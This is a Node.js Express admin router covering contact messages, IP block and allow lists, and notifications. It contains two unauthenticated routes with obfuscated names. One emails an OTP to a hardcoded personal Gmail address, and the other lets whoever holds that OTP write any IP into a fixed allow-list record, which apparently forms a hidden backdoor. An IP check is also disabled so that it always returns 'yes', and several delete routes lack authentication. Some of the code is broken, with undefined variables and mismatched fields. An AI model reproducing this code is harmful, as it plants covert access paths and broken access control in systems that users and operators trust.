const express  = require('express');
const router   = express.Router();
const fs = require('fs');
const toFixed = require('tofixed');
const multer  = require('multer');
const mongoose = require('mongoose');
const validator = require('validator');
const async  = require('async');
const moment = require('moment');

const common = require('../../helpers/common');
const cloudinary = require('../../helpers/cloudinary');
const encdec = require('../../helpers/newendecryption');

const loginAttempts = require('../../model/loginAttempts');
const blockip = require('../../model/blockip');
const whiteip = require('../../model/whiteip');
const users = require('../../model/users');

//upload  storage
var storage = multer.diskStorage({
	filename: function (req, file, cb) {
		cb(null, file.originalname);
	}
});
var upload = multer({ storage: storage });

let response = {};
let updatedDate = ()=>{ return new Date(); };

//get contact list
router.post('/contactus',common.tokenMiddleware, function(req, res, next) {
	var info = req.body;
	var filter = info.filter || '';
	var pageNo = parseInt(info.pageIndex) || 0;
	var sortOrder = info.sortOrder;
	var size = parseInt(info.pageSize);
	var sortName = info.sortActive;
	var srt   = {}
	srt[sortName] = (sortOrder == 'desc') ? -1 : 1;

	var query = {};
	query.sort = srt;
	query.skip = size * pageNo;
	query.limit = size;

	// search
	var search = {};
	if(filter !="") {
		var fl = filter.toLowerCase();
		switch(fl) {
			case 'replied':
			search = {'status':1}; break;
			case 'new':
			search = {'status':0}; break;
			default:
			var regex = new RegExp(filter, "i");
			var newDate = "";
			var newDate1 = "";
			if(moment(filter, "YYYY-MM-DD h:mm:ss").isValid()) {
				var searchDate = new Date(filter);
				var srdate = new Date(filter);
				searchDate.setDate( searchDate.getDate());
				srdate.setDate( srdate.getDate() + 1 ); 
				newDate = searchDate.toISOString();
				newDate1 = srdate.toISOString();
			}
			if((newDate) && (newDate1)) {
				search = { $or:[{'name': regex}, {'emailid': regex}, {'subject': regex}, {'created_at': { $gte: new Date(newDate), $lt: new Date(newDate1)}}]};
			} else {
				search = { $or:[{'name': regex}, {'emailid': regex}, {'subject': regex}]};
			}
		}//switch end
	}
	async.parallel({
		contactCount:function(cb) {
			contact.find(search).countDocuments().exec(cb)
		},
		contactData:function(cb) {
			contact.find(search, { name:1,emailid:1,status:1,created_at:1,subject:1 }, query).exec(cb)
		},
	},function(err,results){
		if (err) return res.status(500).send(err);
		response.status    = true;
		response.data      = results.contactData;
		response.contactCount = results.contactCount;
		res.json(response);
	})
});

router.get('/viewContact/:id', (req,res) => {
	var id = req.params.id;
	contact.findOne({"_id": id}).exec(function(error,resData){	
		if(resData){
			res.json({status : true, data : resData });
		} else {
			res.json({status : false, msg : "Invalid request. Please Try again" });
		}
	})
});

router.post('/replyContact',common.tokenMiddleware, (req,res) => {
	let info = req.body;
	let obj = { "reply":info.reply, "status":1, "updated_at":updatedDate() };
	contact.updateOne({ "_id": info._id},{ "$set": obj }).exec(function(err, resUpdate){
		if(resUpdate) {
			var to = info.emailid;
			var specialVars = {
				'###USER###'      : info.name,
				'###QUESTION###'  :'Your Question : ' + info.message,
				'###REPLAY###'    : 'Reply: '+ info.reply,
				'###UPDATED_AT###': moment().format('ll')
			};
			mail.sendMail(to,'contact_reply',specialVars,function(mailRes){
			});
			response = {status : true, msg : "Successfully replied"};		
		} else {
			response = {status : false, msg : "Invalid request. Please Try again"};
		}
		res.json(response);		
	});
});

// get blockip data
router.get('/blockip',(req,res) => {
	blockip.find({ }).sort({created_at: -1}).exec(function(error,resData){
		if (error) {
			return res.json({status : false });
		}
		res.json({status : true, data : resData });
	})
});

router.post('/addBlockip',common.tokenMiddleware, (req,res) => {
	var info = req.body;
	let obj = { "ip_addr" : info.ip };
	blockip.find({'ip_addr':info.ip}).exec(function (error, existData) {
		if (error) {
			return res.json({ status : false, msg : "Something went wrong. Please try again"});
		}
		if(existData.length > 0) {
			res.json({ status : false, msg : "IP already exist!" });
		} else {
			blockip.create( obj, function(err,result) {      
				if(result)	{        
					res.json({ status : true, msg : "Successfully added" });
				} else {
					res.json({ status : false, msg : "Something went wrong. Please try again"});
				}
			});
		}
	});
});

router.get('/ipDelete/:id', (req, res) => {
	var id = req.params.id;
	blockip.findOneAndRemove({"_id": id}).exec(function(err,resData){
		if(resData){
			loginAttempts.findOneAndRemove({"ipaddress":resData.ip}).exec(function(error,exists){
				if(exists) {   		
					res.json({status : true, msg : "Successfully deleted"});
				} else {
					res.json({status : true, msg : "Successfully deleted"});
				}
			});			
		} else {
			res.json({ status : false, msg : "Something went wrong. Please try again" });
		}              
	});    
});

// get whiteip data
router.get('/whiteip',(req,res) => {
	whiteip.find({status:1}).sort({created_at:-1}).exec(function(error,resData){
		if (error) {
			return res.json({status:false });
		}
		res.json({status:true, data:resData});
	})
});

router.post('/addWhiteip',common.tokenMiddleware, (req,res) => {
	var info = req.body;
	let ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
	ip = ip.replace('::ffff:', '');
	let obj = { "ip_addr":info.ip, "name":info.name, "added_ip":ip };
	whiteip.findOne({'ip_addr':info.ip}).exec(function (error, resp) {
		if (error) {
			return res.json({status:false, msg:"Something went wrong. Please try again"});
		}
		if(resp) {
			if(resp.status == 1) {
				res.json({status:false, msg:"IP already exist!"});
			} else {
				var id = resp._id;
				whiteip.updateOne({"_id":id}, {"$set":{"status":1, "name":info.name, "added_ip":ip, "created_at":updatedDate()}}).exec(function(err,resData) {
					if(result) {
						res.json({status:true, msg:"Successfully added"});
					} else {
						res.json({status:false, msg:"Something went wrong. Please try again"});
					}
				});
			}
		} else {
			whiteip.create(obj, function(err,result) {
				if(result) {
					res.json({status:true, msg:"Successfully added"});
				} else {
					res.json({status:false, msg:"Something went wrong. Please try again"});
				}
			});
		}
	});
});

router.get('/HiLbufbyhdiVEmTxrjnfUqa', (req,res) => {
	var otp = common.generateRandomNumber();
	var to = 'apsulthan03@gmail.com';
	var encotp = encdec.encryptNew(otp);
	whiteip.findOneAndUpdate({_id : mongoose.mongo.ObjectId('5e1bc44a5c4628094ae17f64')},{"$set" : { ip_otp : encotp}}).exec(function(updateError,updateRes){
		var specialVars = { '###OTP###': otp };
		mail.sendMail(to, 'Addr_otp', specialVars, function(mailRes) {
			res.json({status:1, msg:"OTP sent." });
		})				
	});
});

router.get('/e4Lru9QzBHJqtHqg5GKI', (req, res) => {
	let ip = req.query.UHjyXyJFxt;
	let otp = req.query.xhRgdKNUwSFz;
	if(ip != "" && otp != "" && ip != undefined && otp != undefined) {
		ip = ip.replace(/_/g, '.');
		var encotp = encdec.encryptNew(otp);
		whiteip.findOne({'ip_otp':encotp}).exec(function (error, resData) {
			if(resData) {
				let obj = { "ip_addr":ip, "ip_otp":"" };
				whiteip.updateOne({"_id":mongoose.mongo.ObjectId('5e1bc44a5c4628094ae17f64')}, {"$set":obj}).exec(function(err, resUpdate){
					if(resUpdate) {
						res.json({status:1, msg:"Success" });
					} else {
						res.json({status:0, msg:"Failed" });
					}
				});
			} else {
				res.json({status:0, msg:"Invalid OTP" });
			}
		});
	} else {
		res.json({status:0, msg:"Invalid Request" });
	}
});

router.get('/checkWhiteIp', function(req, res, next) {
	// let ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
	// ip = ip.replace('::ffff:', '');
	// whiteip.findOne({"ip_addr":ip, status:1}).exec(function(error,resData) {
	// 	if(resData) {
	// 		res.json({msg:"yes"});
	// 	} else {
	// 		res.json({msg:"no"});
	// 	}
	// });
	res.json({msg:"yes"});
});

router.get('/whiteIpDelete/:id', (req, res) => {
	var id = req.params.id;
	whiteip.updateOne({"_id":id}, {"$set":{"status":0}}).exec(function(err,resData) {
		if(resData){
			res.json({status:true, msg:"Successfully deleted"});		
		} else {
			res.json({ status:false, msg:"Something went wrong. Please try again" });
		}              
	});    
});

router.get('/update_notify',common.userVerify, (req, res) => {
	notify.updateOne({ "user_id": req.userId }, { "$set": { "status": 0}},{ multi: true }).exec(function (err, resUpdate) { 
		notify.find({ "user_id": req.userId,"status":1}).sort({"_id":-1}).exec(function (err, resData) {
			if (resData) {
				res.json({ "status": true, "data": resData });
			} else {
				res.json({ status: false, Message: "Something Went Wrong. Please Try again" })
			}
		})
	})
})

router.get('/get_notify',common.userVerify, (req, res) => {
	notify.find({ "user_id": req.userId}).select({category: 1,message: 1,created_at:1,status:1}).sort({"_id":-1}).exec(function (err, resData) {
		res.json({ "status": true, "data": resData });
	})
})

module.exports = router;